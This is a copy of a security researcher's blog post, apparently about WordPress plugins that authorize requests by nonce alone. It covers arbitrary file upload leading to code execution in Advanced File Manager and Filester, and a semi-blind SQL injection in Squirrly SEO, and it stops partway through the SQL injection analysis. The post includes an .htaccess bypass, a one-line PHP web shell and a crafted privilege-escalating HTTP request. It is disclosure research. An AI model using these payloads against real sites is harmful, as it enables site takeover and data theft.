<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://nowotarski.info/wordpress-nonce-authorization/">Original</a>
    <h1>Exploiting authorization by nonce in WordPress plugins</h1>
    
    <div id="readability-page-1" class="page"><p><strong>tl;dr:</strong>
			Many WordPress plugins use nonces and nothing else to authorize requests. This often has a potential for exploitation to gain privilege escalation. In this article, I elaborate on WordPress security features connected to nonces and AJAX/REST requests and describe three critical vulnerabilities I’ve found in popular WordPress plugins.
		</p><section>
			
<p>As of 2024, WordPress powers 43% of all websites in the internet. 474 million websites run WordPress software and one or more out of 70 000 plugins. Unfortunately, as history shows, many WordPress plugins, even popular ones, often contain security vulnerabilities. Sometimes these vulnerabilities are trivial to find.</p>
<p>So far this year, 280 critical (CVSS score 9.0+) vulnerabilities have been found in WordPress plugins. Critical vulnerabilities usually allow taking over a WordPress instance which can lead to data leaks, malware injection, or transitioning them into C2 servers.</p>
<p>I’ve learned about the last example while reading <a href="https://blog.talosintelligence.com/tinyturla-next-generation/">Turla APT spies on Polish NGOs</a> by Cisco Talos who explains attacks against polish NGOs. In this campaign compromised WordPress websites were used as Command &amp; Control servers. This led me to do a (limited) WordPress plugins security research in Q2/2024.</p>
<p>In this article, I elaborate on WordPress security features connected to nonces and AJAX/REST requests. I also describe three critical vulnerabilities I’ve found in popular WordPress plugins (100k+, 100k+, 60k+ active installations).</p>

<p>Below I explain built-in security features that WordPress plugin developers can use for authentication, authorization, and nonces generation. Later, I will use some vulnerable plugins to show that these features are not always used as intended.</p>
<h2 id="wp_ajax-and-rest-handlers"><code>wp_ajax</code> and REST handlers</h2>
<p>When testing web apps one of the first things I check are AJAX handlers and REST API calls. Very often these small snippets of code contain logic, authorization bugs, or simply miss authentication part to access them.</p>
<p>It was no different in WordPress plugins. I’ve found several instances in which there was no authorization at all or authorization was done by nonce which is not what nonces are meant to be used for.</p>
<p>WordPress has a built-in architecture for AJAX calls. Plugin developers can call:</p>
<div><pre tabindex="0"><code data-lang="php"><span><span>1</span><span><span>add_action</span><span>(</span> <span>&#39;wp_ajax_action_name&#39;</span><span>,</span> <span>array</span><span>(</span><span>&amp;</span><span>$this</span><span>,</span> <span>&#39;function_name&#39;</span><span>));</span>
</span></span><span><span>2</span><span><span>add_action</span><span>(</span> <span>&#39;wp_ajax_nopriv_action_name&#39;</span><span>,</span> <span>array</span><span>(</span><span>&amp;</span><span>$this</span><span>,</span> <span>&#39;function_name&#39;</span><span>));</span>
</span></span></code></pre></div><p>The <code>nopriv</code> part in the action name means that WordPress will skip the authentication step before executing the function handler, in other words: these AJAX calls are available for any users, also those who are not logged in.</p>
<p>It is a little bit different for REST API which is also a built-in functionality of WordPress. The API routes are registered using <code>register_rest_route</code> function:</p>
<div><pre tabindex="0"><code data-lang="php"><span><span>1</span><span><span>register_rest_route</span><span>(</span>
</span></span><span><span>2</span><span>    <span>$this</span><span>-&gt;</span><span>namespace</span><span>,</span> <span>&#39;/get/&#39;</span><span>,</span> <span>array</span><span>(</span>
</span></span><span><span>3</span><span>        <span>&#39;methods&#39;</span> <span>=&gt;</span> <span>WP_REST_Server</span><span>::</span><span>READABLE</span><span>,</span>
</span></span><span><span>4</span><span>        <span>&#39;callback&#39;</span> <span>=&gt;</span> <span>array</span><span>(</span><span>$this</span><span>,</span> <span>&#39;getData&#39;</span><span>),</span>
</span></span><span><span>5</span><span>        <span>&#39;permission_callback&#39;</span> <span>=&gt;</span> <span>&#39;__return_true&#39;</span>
</span></span><span><span>6</span><span>    <span>)</span>
</span></span><span><span>7</span><span><span>);</span>
</span></span></code></pre></div><p>The interesting part is <code>permission_callback</code> which is a callback to function responsible for checking if a given user is authorized to call the API method. As can be seen in the example above, often a built-in <code>__return_true</code> function is used which simply skips user permissions check. If there is no additional code to check permissions inside the API method handler, any user can call it.</p>
<h2 id="nonce-value-generation">Nonce value generation</h2>
<p>Another observation I made was that many WordPress plugins use nonces to authenticate and authorize users, often not checking if a given user has permissions to perform a given action or (in case of <code>nopriv</code> AJAX handlers) if a user is logged in at all.</p>
<p>WordPress has a built-in mechanism for generating and verifying nonces. Developers can use: <code>wp_create_nonce</code> to create and <code>wp_verify_nonce</code> to verify nonces. A nonce is generated using the following function:</p>
<div><pre tabindex="0"><code data-lang="php"><span><span> 1</span><span><span>function</span> <span>wp_create_nonce</span><span>(</span> <span>$action</span> <span>=</span> <span>-</span><span>1</span> <span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>    <span>$user</span> <span>=</span> <span>wp_get_current_user</span><span>();</span>
</span></span><span><span> 3</span><span>    <span>$uid</span>  <span>=</span> <span>(</span><span>int</span><span>)</span> <span>$user</span><span>-&gt;</span><span>ID</span><span>;</span>
</span></span><span><span> 4</span><span>    <span>if</span> <span>(</span> <span>!</span> <span>$uid</span> <span>)</span> <span>{</span>
</span></span><span><span> 5</span><span>        <span>/** This filter is documented in wp-includes/pluggable.php */</span>
</span></span><span><span> 6</span><span>        <span>$uid</span> <span>=</span> <span>apply_filters</span><span>(</span> <span>&#39;nonce_user_logged_out&#39;</span><span>,</span> <span>$uid</span><span>,</span> <span>$action</span> <span>);</span>
</span></span><span><span> 7</span><span>    <span>}</span>
</span></span><span><span> 8</span><span>
</span></span><span><span> 9</span><span>    <span>$token</span> <span>=</span> <span>wp_get_session_token</span><span>();</span>
</span></span><span><span>10</span><span>    <span>$i</span>     <span>=</span> <span>wp_nonce_tick</span><span>(</span> <span>$action</span> <span>);</span>
</span></span><span><span>11</span><span>
</span></span><span><span>12</span><span>    <span>return</span> <span>substr</span><span>(</span> <span>wp_hash</span><span>(</span> <span>$i</span> <span>.</span> <span>&#39;|&#39;</span> <span>.</span> <span>$action</span> <span>.</span> <span>&#39;|&#39;</span> <span>.</span> <span>$uid</span> <span>.</span> <span>&#39;|&#39;</span> <span>.</span> <span>$token</span><span>,</span> <span>&#39;nonce&#39;</span> <span>),</span> <span>-</span><span>12</span><span>,</span> <span>10</span> <span>);</span>
</span></span><span><span>13</span><span><span>}</span>
</span></span></code></pre></div><p>There are two parts of this function that may be unclear: how <code>wp_nonce_tick</code> and <code>wp_hash</code> work. <code>wp_nonce_tick</code> divides the current Unix timestamp by the lifespan of a nonce (default is 12 hours), resulting in a “tick” number that changes every 12 hours. This tick value ensures that nonces are time-sensitive, providing a measure of security against replay attacks by making nonces valid only within a specific time window. <code>wp_hash</code> is concatenating tick, action, user id, and token (if user logged in) then salting it and hashing using HMAC-MD5. The salt is the same for all hashes, it is either <code>NONCE_KEY</code> and <code>NONCE_SALT</code> or <code>SECRET_KEY</code> and <code>SECRET_SALT</code> if <code>NONCE_*</code> consts are not set.</p>
<p>There are two interesting properties of <code>wp_create_nonce</code> function.</p>
<p>Nonces can be generated <em>offline</em> for unauthenticated users if <code>NONCE_*</code> or <code>SECRET_*</code> consts are known. In this case, <code>$uid</code> will be equal <code>0</code> and <code>$token</code> will be an empty string. This means that Arbitrary File Read vulnerabilities that give access to <code>wp-config.php</code>, or SQL Injection vulnerabilities that allow reading these consts from a DB or simply XSS (against an admin with access to consts) can be chained to exploit access to the code execution in other plugins which are only protected by <code>wp_verify_nonce</code> function (like <code>wp_ajax_nopriv</code> handlers).</p>
<p>Another property is that nonce’s action parameter is not namespaced: any plugin can generate nonce for any other plugin or WordPress core. This means that any flaw which allows calling <code>wp_create_nonce</code> with arbitrary value can, again, lead to vulnerabilities in other plugins.</p>

<p>The next sections describe three vulnerabilities I’ve found in popular WordPress plugins. Two of these are exploiting <code>wp_ajax</code> handlers, REST API, and the fact that nonce is used as an authorization method (what has been discussed so far in this article). The third is an interesting <em>semi</em> Blind SQL Injection which also exploits the fact that an access token is available to all Contributor+ level users. This one could be adapted as a nice <a href="https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)">CTF challenge</a>!</p>
<h2 id="arbitrary-file-upload--rce-in-advanced-file-manager">Arbitrary File Upload / RCE in Advanced File Manager</h2>
<p>Advanced File Manager is a WordPress plugin with 100k+ active installations. It was vulnerable to Remote Code Execution (by Arbitrary File Upload) that can be triggered by any user with access to the plugin, possibly also unauthenticated users (configurable in plugin settings) via <code>fma_load_shortcode_fma_ui</code> AJAX action.</p>
<p>The plugin has several protections against arbitrary <code>.htaccess</code> and <code>*.php</code> files upload: it checks uploaded file names but also tries to guess mime type based on file extension and file contents. Because of bugs in these protections, it was possible to upload <code>.htaccess</code> file that will make Apache webserver to run PHP code for extensions other than <code>.php</code>.</p>
<p>The first bug that allows <code>.htaccess</code> filename protection bypass can be found in <code>fma_plugin_file_validName</code> function:</p>
<div><pre tabindex="0"><code data-lang="php"><span><span>230</span><span> <span>function</span> <span>fma_plugin_file_validName</span><span>(</span><span>$name</span><span>)</span> <span>{</span>
</span></span><span><span>231</span><span>	<span>if</span><span>(</span><span>!</span><span>empty</span><span>(</span><span>$name</span><span>))</span> <span>{</span>
</span></span><span><span>232</span><span>		<span>$name</span> <span>=</span> <span>sanitize_file_name</span><span>(</span><span>$name</span><span>);</span>
</span></span><span><span>233</span><span>		<span>if</span><span>(</span><span>strpos</span><span>(</span><span>$name</span><span>,</span> <span>&#39;.php&#39;</span><span>)</span> <span>||</span> <span>strpos</span><span>(</span><span>$name</span><span>,</span> <span>&#39;.ini&#39;</span><span>)</span> <span>||</span> <span>strpos</span><span>(</span><span>$name</span><span>,</span> <span>&#39;.htaccess&#39;</span><span>)</span> <span>||</span> <span>strpos</span><span>(</span><span>$name</span><span>,</span> <span>&#39;.config&#39;</span><span>))</span> <span>{</span>
</span></span><span><span>234</span><span>			<span>return</span> <span>false</span><span>;</span>
</span></span><span><span>235</span><span>		<span>}</span> <span>else</span> <span>{</span>
</span></span><span><span>236</span><span>			<span>return</span> <span>strpos</span><span>(</span><span>$name</span><span>,</span> <span>&#39;.&#39;</span><span>)</span> <span>!==</span> <span>0</span><span>;</span>
</span></span><span><span>237</span><span>		<span>}</span>
</span></span><span><span>238</span><span>	<span>}</span>
</span></span><span><span>239</span><span><span>}</span></span></span></code></pre></div>
<p>When <code>.htaccess</code> value is passed in <code>$name</code> parameter it is changed to <code>htaccess</code> by <code>sanitize_file_name</code> which makes the consecutive <code>strpos</code> call to return <code>FALSE</code>. The consecutive <code>strpos($name, &#39;.&#39;) !== 0;</code> in the <code>else</code> clause will return <code>TRUE</code> because . (dot) was removed previously by <code>sanitize_file_name</code>.</p>
<p>Because of this, we can upload a <code>.htaccess</code> file with the following contents:</p>
<pre tabindex="0"><code>AddType application/x-httpd-php .ptp
</code></pre><p>This will make Apache server interpret all <code>.ptp</code> files as PHP code and execute them.</p>
<p>Next, we can upload a PHP code file with <code>.ptp</code> extension. We bypass mime check by prepending the PHP code with 1000 ‘a’ letters:</p>
<div><pre tabindex="0"><code data-lang="php"><span><span>1</span><span><span>a</span> <span>x</span> <span>1000</span> <span>&lt;</span><span>br</span> <span>/&gt;&lt;?</span><span>php</span> <span>system</span><span>(</span><span>$_GET</span><span>[</span><span>&#39;cmd&#39;</span><span>]);</span>
</span></span></code></pre></div><p>The remaining part to access vulnerable code is a nonce value however it can be found in the plugin frontend by any user with access to plugin:</p>
<div><pre tabindex="0"><code data-lang="html"><span><span>1</span><span><span>&lt;</span><span>script</span> <span>id</span><span>=</span><span>&#34;elfinder_script-js-extra&#34;</span><span>&gt;</span>
</span></span><span><span>2</span><span><span>var</span> <span>afm_object</span> <span>=</span> <span>{</span><span>&#34;ajaxurl&#34;</span><span>:</span><span>&#34;http:\/\/localhost:8080\/wp-admin\/admin-ajax.php&#34;</span><span>,</span><span>&#34;nonce&#34;</span><span>:</span><span>&#34;14ce4b925e&#34;</span><span>,</span><span>&#34;locale&#34;</span><span>:</span><span>&#34;en&#34;</span><span>,</span><span>&#34;ui&#34;</span><span>:</span><span>[</span><span>&#34;toolbar&#34;</span><span>,</span><span>&#34;tree&#34;</span><span>,</span><span>&#34;path&#34;</span><span>,</span><span>&#34;stat&#34;</span><span>]};</span>
</span></span><span><span>3</span><span><span>&lt;/</span><span>script</span><span>&gt;</span>
</span></span></code></pre></div><h3 id="duplicate--wontfix">Duplicate / wontfix?</h3>
<p>Unfortunately, after reporting it to Wordfence (WordPress security company), I got a response that this is actually a duplicate of <a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager-advanced-shortcode-2/advanced-file-manager-shortcode-253-authenticated-contributor-arbitrary-file-upload">CVE-2023-7061</a>. I was confused because I was testing the latest release and the CVE ID is from 2023! After some digging, I discovered that there’s an upgrade to this plugin called Shortcodes which is also vulnerable to a very similar method of Arbitrary File Upload. What’s also interesting is that Wordfence published the report about the previously found issue <em>after</em> my report: on July 8, 2024 to be specific. I asked Wordfence team for clarifications and they responded that plugin developer didn’t bother to fix the previously reported issue. Because of this I treated it as <code>wontfix</code> and decided to publish the vulnerability details.</p>
<h2 id="arbitrary-file-upload--rce-in-filester">Arbitrary File Upload / RCE in Filester</h2>
<p>Filester is a WordPress Plugin with 60k+ active installations. It was vulnerable to Remote Code Execution (by Arbitrary File Upload) that can be triggered by any user with access to the plugin (configurable by Admin, with the lowest level being Subscriber).</p>
<p>Filester settings page allows admins to allow access to the plugin for certain roles. For each role, there are several settings like file extensions to lock or file extensions a given role is allowed to upload. Settings are saved using <code>wp_ajax_njt_fs_save_setting</code> AJAX action.</p>
<p>The vulnerability can be found in <code>njt_fs_saveSetting</code> function which runs the AJAX action above:</p>
<div><pre tabindex="0"><code data-lang="php"><span><span>540</span><span>    <span>public</span> <span>function</span> <span>njt_fs_saveSetting</span><span>()</span>
</span></span><span><span>541</span><span>    <span>{</span>
</span></span><span><span>542</span><span>        <span>if</span><span>(</span> <span>!</span> <span>wp_verify_nonce</span><span>(</span> <span>$_POST</span><span>[</span><span>&#39;nonce&#39;</span><span>]</span> <span>,</span><span>&#39;njt-fs-file-manager-admin&#39;</span><span>))</span> <span>wp_die</span><span>();</span>
</span></span><span><span>543</span><span>        <span>check_ajax_referer</span><span>(</span><span>&#39;njt-fs-file-manager-admin&#39;</span><span>,</span> <span>&#39;nonce&#39;</span><span>,</span> <span>true</span><span>);</span></span></span></code></pre></div>
<div><pre tabindex="0"><code data-lang="php"><span><span>560</span><span>        <span>//update options
</span></span></span><span><span>561</span><span><span></span>        <span>update_option</span><span>(</span><span>&#39;njt_fs_settings&#39;</span><span>,</span> <span>$this</span><span>-&gt;</span><span>options</span><span>);</span>
</span></span><span><span>562</span><span>        <span>wp_send_json_success</span><span>(</span><span>get_option</span><span>(</span><span>&#39;njt_fs_settings&#39;</span><span>));</span>
</span></span><span><span>563</span><span>        <span>wp_die</span><span>();</span>
</span></span><span><span>564</span><span>    <span>}</span></span></span></code></pre></div>
<p>The problem with this function is that there is no code responsible for checking if the user calling the function is an Admin level user or has permission to change settings. Any user with a valid <code>njt-fs-file-manager-admin</code> nonce can trigger this AJAX function. Even though the action name for nonce contains <code>admin</code>, it is generated for all users with access to the plugin and is clearly visible in the plugin frontend code:</p>
<div><pre tabindex="0"><code data-lang="html"><span><span>1</span><span><span>&lt;</span><span>script</span> <span>id</span><span>=</span><span>&#34;njt_fs_elFinder-js-extra&#34;</span><span>&gt;</span>
</span></span><span><span>2</span><span><span>var</span> <span>wpData</span> <span>=</span> <span>{</span> <span>...</span> <span>,</span><span>&#34;nonce&#34;</span><span>:</span><span>&#34;82ca11f675&#34;</span><span>,</span> <span>...</span> <span>};</span>
</span></span><span><span>3</span><span><span>&lt;/</span><span>script</span><span>&gt;</span>
</span></span></code></pre></div><p>Let’s say the Admin allowed Subscribers to use the plugin but locked <code>.php</code> files (when the extension is locked nothing can be done with a file: upload, download, rename, delete) and allowed uploading <code>.txt</code> files only. Any subscriber can send the following request to remove all restrictions for Subscriber level access:</p>
<div><pre tabindex="0"><code data-lang="http"><span><span> 1</span><span><span>POST</span> <span>/wp-admin/admin-ajax.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
</span></span><span><span> 2</span><span><span>Host</span><span>:</span> <span>localhost:8080</span>
</span></span><span><span> 3</span><span><span>Content-Length</span><span>:</span> <span>224</span>
</span></span><span><span> 4</span><span><span>sec-ch-ua</span><span>:</span> <span>&#34;Chromium&#34;;v=&#34;125&#34;, &#34;Not.A/Brand&#34;;v=&#34;24&#34;</span>
</span></span><span><span> 5</span><span><span>Accept</span><span>:</span> <span>application/json, text/javascript, */*; q=0.01</span>
</span></span><span><span> 6</span><span><span>Content-Type</span><span>:</span> <span>application/x-www-form-urlencoded; charset=UTF-8</span>
</span></span><span><span> 7</span><span><span>X-Requested-With</span><span>:</span> <span>XMLHttpRequest</span>
</span></span><span><span> 8</span><span><span>sec-ch-ua-mobile</span><span>:</span> <span>?0</span>
</span></span><span><span> 9</span><span><span>User-Agent</span><span>:</span> <span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36</span>
</span></span><span><span>10</span><span><span>sec-ch-ua-platform</span><span>:</span> <span>&#34;macOS&#34;</span>
</span></span><span><span>11</span><span><span>Origin</span><span>:</span> <span>http://localhost:8080</span>
</span></span><span><span>12</span><span><span>Sec-Fetch-Site</span><span>:</span> <span>same-origin</span>
</span></span><span><span>13</span><span><span>Sec-Fetch-Mode</span><span>:</span> <span>cors</span>
</span></span><span><span>14</span><span><span>Sec-Fetch-Dest</span><span>:</span> <span>empty</span>
</span></span><span><span>15</span><span><span>Referer</span><span>:</span> <span>http://localhost:8080/wp-admin/admin.php?page=njt-fs-filemanager</span>
</span></span><span><span>16</span><span><span>Accept-Encoding</span><span>:</span> <span>gzip, deflate, br</span>
</span></span><span><span>17</span><span><span>Accept-Language</span><span>:</span> <span>en-GB,en-US;q=0.9,en;q=0.8</span>
</span></span><span><span>18</span><span><span>Cookie</span><span>:</span> <span>...</span>
</span></span><span><span>19</span><span><span>Connection</span><span>:</span> <span>keep-alive</span>
</span></span><span><span>20</span><span>
</span></span><span><span>21</span><span>nonce=7136fcb48c&amp;action=njt_fs_save_setting_restrictions&amp;njt_fs_list_user_restrictions=subscriber&amp;list_user_restrictions_alow_access=&amp;private_folder_access=&amp;private_url_folder_access=&amp;hide_paths=&amp;lock_files=&amp;can_upload_mime=
</span></span></code></pre></div><p>This issue has been fixed in version 1.8.3 and has been assigned CVE-2024-7031.</p>
<h2 id="semi-blind-sql-injection-in-seo-plugin-by-squirrly">Semi-Blind SQL Injection in SEO Plugin by Squirrly</h2>
<p>squirrly-seo WordPress plugin (100k+ active installations) is vulnerable to semi-blind SQL Injection in RestAPI endpoint. The root cause is in <code>controllers/Api.php</code> file. The <code>$url</code> parameter is not properly sanitized which allows appending <code>UNION</code> query to a <code>SELECT</code> SQL query in the <code>$query</code> variable. This allows extracting any information from WordPress DB.</p>
<h3 id="searching-for-sql-injection-in-wordpress-plugins">Searching for SQL injection in WordPress plugins</h3>
<p>There are dozens of SQL queries in every WP plugin. A manual search for places that may provide injection opportunities seems cumbersome. That’s why I decided to write a little PHP code scanner that helped me find code snippets that might be vulnerable to SQL injection.</p>
<p>The idea is simple: first, find all occurrences of method calls interacting with a DB like <code>execute</code>, <code>query</code>, <code>get_row</code>, etc. with variable argument. This <a href="https://regex101.com/r/1vhVKN/2">regexp</a> can help to find such calls (note we’re not matching <code>$wpdb</code> because plugins sometimes wrap it and use their own DB class):</p>
<pre tabindex="0"><code data-lang="regexp">/db-&gt;(get_[a-z]+|query|execute)\(\s*\$([a-zA-Z0-9_]*)\s*\)/
</code></pre><p>Second, take that variable’s name and check if its assigned value is a return value of <code>prepare()</code>. We can skip such snippets because they are most likely safe. This way we remove a ton of safe calls. Obviously, this method will still return a lot of false positives that need to be manually checked but the number of instances is much, much smaller than checking all of the DB calls.</p>
<h3 id="getting-one-char-at-a-time">Getting one char at a time</h3>
<p>Exploiting this vulnerability is not trivial (compared to vulnerabilities in which a passed SQL query is simply executed) but it is repeatable and can be trivially exploited when proper exploit code is developed or by using tools like Burp Suite. The complexity lies in the fact that the returned values of the appended query must be integers which are also valid IDs of existing posts in a victim WordPress DB.</p>
<p>The vulnerable code starts in <code>controllers/Api.php</code> at line 267 (<code>getData</code> method).</p>
<p>The problematic lines which will be explained below the code snippet are the following:</p>
<ul>
<li>267: <code>$url</code>: attacker controlled variable,</li>
<li>281: <code>$url_decoded</code> variable derived from attacker controlled value, transformation allows SQL injection (passing <code>&#39;</code> value to a query which is not <code>prepare()</code>’d),</li>
<li>285: SQL injection query,</li>
<li>291: query execution,</li>
<li>294: results parsing, the most interesting part.</li>
</ul>
<div><pre tabindex="0"><code data-lang="php"><span><span>245</span><span><span>public</span> <span>function</span> <span>getData</span><span>(</span><span>WP_REST_Request</span> <span>$request</span><span>)</span>
</span></span><span><span>246</span><span><span>{</span>
</span></span><span><span>247</span><span>
</span></span><span><span>248</span><span>    <span>global</span> <span>$wpdb</span><span>;</span>
</span></span><span><span>249</span><span>    <span>$response</span> <span>=</span> <span>array</span><span>();</span>
</span></span><span><span>250</span><span>    <span>SQ_Classes_Helpers_Tools</span><span>::</span><span>setHeader</span><span>(</span><span>&#39;json&#39;</span><span>);</span>
</span></span><span><span>251</span><span>
</span></span><span><span>252</span><span>    <span>//get the token from API
</span></span></span><span><span>253</span><span><span></span>    <span>$token</span> <span>=</span> <span>$request</span><span>-&gt;</span><span>get_param</span><span>(</span><span>&#39;token&#39;</span><span>);</span>
</span></span><span><span>254</span><span>    <span>if</span> <span>(</span><span>$token</span> <span>&lt;&gt;</span> <span>&#39;&#39;</span><span>)</span> <span>{</span>
</span></span><span><span>255</span><span>        <span>$token</span> <span>=</span> <span>sanitize_text_field</span><span>(</span><span>$token</span><span>);</span>
</span></span><span><span>256</span><span>    <span>}</span>
</span></span><span><span>257</span><span>
</span></span><span><span>258</span><span>    <span>if</span> <span>(</span><span>!</span><span>$this</span><span>-&gt;</span><span>token</span> <span>||</span> <span>$this</span><span>-&gt;</span><span>token</span> <span>&lt;&gt;</span> <span>$token</span><span>)</span> <span>{</span>
</span></span><span><span>259</span><span>        <span>exit</span><span>(</span><span>wp_json_encode</span><span>(</span><span>array</span><span>(</span><span>&#39;error&#39;</span> <span>=&gt;</span> <span>esc_html__</span><span>(</span><span>&#34;Connection expired. Please try again.&#34;</span><span>,</span> <span>&#39;squirrly-seo&#39;</span><span>))));</span>
</span></span><span><span>260</span><span>    <span>}</span>
</span></span><span><span>261</span><span>
</span></span><span><span>262</span><span>    <span>$select</span> <span>=</span> <span>$request</span><span>-&gt;</span><span>get_param</span><span>(</span><span>&#39;select&#39;</span><span>);</span>
</span></span><span><span>263</span><span>
</span></span><span><span>264</span><span>    <span>switch</span> <span>(</span><span>$select</span><span>)</span> <span>{</span>
</span></span><span><span>265</span><span>        <span>case</span> <span>&#39;innerlinks&#39;</span><span>:</span>
</span></span><span><span>266</span><span>
</span></span><span><span>267</span><span>            <span>$url</span> <span>=</span> <span>esc_url_raw</span><span>(</span><span>$request</span><span>-&gt;</span><span>get_param</span><span>(</span><span>&#39;url&#39;</span><span>));</span>
</span></span><span><span>268</span><span>            <span>$start</span> <span>=</span> <span>(</span><span>int</span><span>)</span><span>$request</span><span>-&gt;</span><span>get_param</span><span>(</span><span>&#39;start&#39;</span><span>);</span>
</span></span><span><span>269</span><span>            <span>$limit</span> <span>=</span> <span>(</span><span>int</span><span>)</span><span>$request</span><span>-&gt;</span><span>get_param</span><span>(</span><span>&#39;limit&#39;</span><span>);</span>
</span></span><span><span>270</span><span>
</span></span><span><span>271</span><span>            <span>if</span> <span>(</span><span>$url</span> <span>==</span> <span>&#39;&#39;</span><span>)</span> <span>{</span>
</span></span><span><span>272</span><span>                <span>exit</span><span>(</span><span>wp_json_encode</span><span>(</span><span>array</span><span>(</span><span>&#39;error&#39;</span> <span>=&gt;</span> <span>esc_html__</span><span>(</span><span>&#34;Wrong Params&#34;</span><span>,</span> <span>&#39;squirrly-seo&#39;</span><span>))));</span>
</span></span><span><span>273</span><span>            <span>}</span>
</span></span><span><span>274</span><span>
</span></span><span><span>275</span><span>            <span>//define vars
</span></span></span><span><span>276</span><span><span></span>            <span>if</span><span>(</span><span>$limit</span> <span>==</span> <span>0</span><span>)</span> <span>$limit</span> <span>=</span> <span>1000</span><span>;</span>
</span></span><span><span>277</span><span>
</span></span><span><span>278</span><span>            <span>//prepare the url for query
</span></span></span><span><span>279</span><span><span></span>            <span>$url_backslash</span> <span>=</span> <span>str_replace</span><span>(</span><span>&#39;/&#39;</span><span>,</span><span>&#39;\/&#39;</span><span>,</span><span>str_replace</span><span>(</span><span>rtrim</span><span>(</span><span>home_url</span><span>(),</span><span>&#39;/&#39;</span><span>),</span><span>&#39;&#39;</span><span>,</span><span>$url</span><span>));</span>
</span></span><span><span>280</span><span>            <span>$url_encoded</span> <span>=</span> <span>urlencode</span><span>(</span><span>str_replace</span><span>(</span><span>trim</span><span>(</span><span>home_url</span><span>(),</span><span>&#39;/&#39;</span><span>),</span><span>&#39;&#39;</span><span>,</span><span>$url</span><span>));</span>
</span></span><span><span>281</span><span>            <span>$url_decoded</span> <span>=</span> <span>str_replace</span><span>(</span><span>trim</span><span>(</span><span>home_url</span><span>(),</span><span>&#39;/&#39;</span><span>),</span><span>&#39;&#39;</span><span>,</span><span>urldecode</span><span>(</span><span>$url</span><span>));</span>
</span></span><span><span>282</span><span>
</span></span><span><span>283</span><span>            <span>//get post inner links
</span></span></span><span><span>284</span><span><span></span>            <span>$select_table</span> <span>=</span> <span>$wpdb</span><span>-&gt;</span><span>prepare</span><span>(</span><span>&#34;SELECT ID, post_content FROM `</span><span>$wpdb-&gt;posts</span><span>` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d&#34;</span><span>,</span> <span>&#39;publish&#39;</span><span>,</span> <span>$start</span><span>,</span> <span>$limit</span><span>);</span>
</span></span><span><span>285</span><span>            <span>$query</span> <span>=</span> <span>&#34;SELECT `ID` FROM (</span><span>$select_table</span><span>) as p WHERE (p.post_content LIKE &#39;%</span><span>$url</span><span>%&#39; OR p.post_content LIKE &#39;%</span><span>$url_backslash</span><span>%&#39; OR p.post_content LIKE &#39;%</span><span>$url_encoded</span><span>%&#39; OR p.post_content LIKE &#39;%</span><span>$url_decoded</span><span>%&#39;)&#34;</span><span>;</span>
</span></span><span><span>286</span><span>
</span></span><span><span>287</span><span>            <span>if</span><span>(</span><span>!</span><span>$inner_links</span> <span>=</span> <span>wp_cache_get</span><span>(</span><span>md5</span><span>(</span><span>$query</span><span>)))</span> <span>{</span>
</span></span><span><span>288</span><span>                <span>//prepare the inner_links array
</span></span></span><span><span>289</span><span><span></span>                <span>$inner_links</span> <span>=</span> <span>array</span><span>();</span>
</span></span><span><span>290</span><span>
</span></span><span><span>291</span><span>                <span>if</span> <span>(</span> <span>$rows</span> <span>=</span> <span>$wpdb</span><span>-&gt;</span><span>get_results</span><span>(</span> <span>$query</span> <span>)</span> <span>)</span> <span>{</span>
</span></span><span><span>292</span><span>                    <span>if</span> <span>(</span> <span>!</span> <span>empty</span><span>(</span> <span>$rows</span> <span>)</span> <span>)</span> <span>{</span>
</span></span><span><span>293</span><span>                        <span>foreach</span> <span>(</span> <span>$rows</span> <span>as</span> <span>$row</span> <span>)</span> <span>{</span>
</span></span><span><span>294</span><span>                            <span>if</span> <span>(</span> <span>untrailingslashit</span><span>(</span> <span>get_permalink</span><span>(</span> <span>$row</span><span>-&gt;</span><span>ID</span> <span>)</span> <span>)</span> <span>&lt;&gt;</span> <span>$url</span> <span>)</span> <span>{</span>
</span></span><span><span>295</span><span>                                <span>$inner_links</span><span>[]</span> <span>=</span> <span>get_permalink</span><span>(</span> <span>$row</span><span>-&gt;</span><span>ID</span> <span>);</span>
</span></span><span><span>296</span><span>                            <span>}</span>
</span></span><span><span>297</span><span>                        <span>}</span>
</span></span><span><span>298</span><span>                    <span>}</span>
</span></span><span><span>299</span><span>                <span>}</span>
</span></span><span><span>300</span><span>
</span></span><span><span>301</span><span>            <span>}</span></span></span></code></pre></div>
<p>First of all <code>$url</code> variable is controlled by a user and is used to create 3 other variables (<code>$url_backslack</code>, <code>$url_encoded</code> and <code>$url_decoded</code>) from which the last one is not properly escaping <code>&#39;</code> character because <code>url_decode</code> PHP function is called on a user-provided parameter. So <code>%27</code> sequence will be changed to <code>&#39;</code>.</p>
<p>This allows appending a <code>UNION</code> part to an existing <code>SELECT</code> query via <code>$url_decoded</code> variable because it is enclosed in <code>&#39;</code> thus not properly escaped:</p>
<div><pre tabindex="0"><code data-lang="php"><span><span>284</span><span><span>$select_table</span> <span>=</span> <span>$wpdb</span><span>-&gt;</span><span>prepare</span><span>(</span><span>&#34;SELECT ID, post_content FROM `</span><span>$wpdb-&gt;posts</span><span>` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d&#34;</span><span>,</span> <span>&#39;publish&#39;</span><span>,</span> <span>$start</span><span>,</span> <span>$limit</span><span>);</span>
</span></span><span><span>285</span><span><span>$query</span> <span>=</span> <span>&#34;SELECT `ID` FROM (</span><span>$select_table</span><span>) as p WHERE (p.post_content LIKE &#39;%</span><span>$url</span><span>%&#39; OR p.post_content LIKE &#39;%</span><span>$url_backslash</span><span>%&#39; OR p.post_content LIKE &#39;%</span><span>$url_encoded</span><span>%&#39; OR p.post_content LIKE &#39;%</span><span>$url_decoded</span><span>%&#39;)&#34;</span><span>;</span></span></span></code></pre></div>
